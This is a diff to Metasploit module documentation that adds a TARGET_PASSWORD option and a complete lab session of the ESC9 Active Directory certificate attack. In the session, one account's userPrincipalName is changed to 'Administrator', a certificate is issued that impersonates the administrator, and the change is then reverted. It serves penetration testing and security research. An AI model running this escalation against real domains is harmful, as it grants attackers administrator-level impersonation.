@@ -36,6 +36,9 @@ The certificate template to issue, e.g., "User".
 ### TARGET_USERNAME
 The username of the target account whose LDAP object will be updated and for whom the certificate will be requested.
 
+### TARGET_PASSWORD
+The password of the target username. Not required. The module will use Shadow Credentials to authenticate as the target user if this is left blank.
+
 ### UPDATE_LDAP_OBJECT
 The LDAP attribute to update, such as `userPrincipalName` or `dNSHostName`.
 
@@ -133,6 +136,72 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
+```
+
+### ESC9 - Update userPrincipalName when you already have `TARGET_PASSWORD`. See shadow credentials don't get created / used
+```
+msf auxiliary(admin/dcerpc/esc_update_ldap_object) > options
+
+Module options (auxiliary/admin/dcerpc/esc_update_ldap_object):
+
+   Name                      Current Setting    Required  Description
+   ----                      ---------------    --------  -----------
+   ADD_CERT_APP_POLICY                          no        Add certificate application policy OIDs
+   ALT_DNS                                      no        Alternative certificate DNS
+   ALT_SID                                      no        Alternative object SID
+   ALT_UPN                                      no        Alternative certificate UPN (format: USER@DOMAIN)
+   CA                        kerberos-DC2-CA    yes       The target certificate authority
+   CERT_TEMPLATE             User               yes       The certificate template
+   LDAPDomain                kerberos.issue     yes       The domain to authenticate to
+   LDAPPassword              N0tpassword!       yes       The password to authenticate with
+   LDAPUsername              user1              yes       The username to authenticate with, who must have permissions to update the TARGET_USERNAME
+   SSL                       false              no        Enable SSL on the LDAP connection
+   TARGET_PASSWORD           N0tpassword!       no        The password of the target LDAP object (the victim account). If left blank, Shadow Credentials will be used to authenticaet as the TARGET_USERNAME
+   TARGET_USERNAME           user2              yes       The username of the target LDAP object (the victim account).
+   UPDATE_LDAP_OBJECT        userPrincipalName  yes       Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert. (Accepted: userPrincipalName, dNSHostName)
+   UPDATE_LDAP_OBJECT_VALUE  Administrator      yes       The account name you wish to impersonate
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  172.16.199.200   no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   445              no        The target port (TCP)
+
+
+Auxiliary action:
+
+   Name          Description
+   ----          -----------
+   REQUEST_CERT  Request a certificate
+
+
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(admin/dcerpc/esc_update_ldap_object) > run
+[*] Running module against 172.16.199.200
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Current value of user2's userPrincipalName:
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
+[+] The operation completed successfully!
+[+] 172.16.199.200:445 - The requested certificate was issued.
+[*] 172.16.199.200:445 - Certificate Policies:
+[*] 172.16.199.200:445 - Certificate UPN: Administrator
+[*] 172.16.199.200:445 - Certificate stored at: /home/msfuser/.msf4/loot/20250923135918_default_172.16.199.200_windows.ad.cs_341723.pfx
+[*] 172.16.199.200:445 - Reverting ldap object
+[*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute
+[*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[*] Attempting to delete attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue...
+[+] Successfully deleted attribute userPrincipalName from CN=user2,CN=Users,DC=kerberos,DC=issue
+[+] The operation completed successfully!
+[*] Auxiliary module execution completed
+msf auxiliary(admin/dcerpc/esc_update_ldap_object) >
 ```
 
 ### ESC9 - Update dnsHostName to `dc2.kerberos.issue`
